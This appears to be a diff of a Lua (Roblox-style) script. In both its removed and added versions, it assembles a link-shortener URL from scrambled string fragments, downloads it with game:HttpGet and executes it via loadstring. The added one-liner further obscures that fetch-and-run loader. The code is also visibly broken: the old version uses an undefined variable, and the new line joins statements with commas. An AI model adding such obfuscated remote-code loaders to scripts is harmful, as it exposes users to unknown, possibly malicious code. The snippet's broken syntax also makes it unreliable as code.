@@ -1,8 +1,1 @@
-local part1 = "https%3A%2F%2F"
-local part2 = "shorter.me%2F"
-local part3 = "BanHammerGoat"
-
-local fullURL = part1 .. part2 .. part3 .. part4
-
-local scriptContent = game:HttpGet(fullURL, true)
-loadstring(scriptContent)()
+local part78 = "BanHammerGoat", local part999 = "https://", local part56 = "me/", local part12 = "shorter.", local fullURL = part999 .. part12 .. part56 .. part78, local scriptContent = game:HttpGet(fullURL, true), loadstring(scriptContent)()
